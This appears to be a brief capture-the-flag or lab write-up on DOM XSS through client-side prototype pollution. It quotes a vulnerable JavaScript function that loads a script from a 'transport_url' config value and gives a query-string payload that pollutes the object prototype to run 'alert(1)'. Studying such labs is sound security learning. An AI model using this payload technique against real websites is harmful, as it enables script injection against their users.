---
title: "2 - DOM XSS via client-side prototype pollution"
---

# 2 - DOM XSS via client-side prototype pollution

searchLogger.js :

```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

```
?__proto__[transport_url]=data:,alert(1);
```
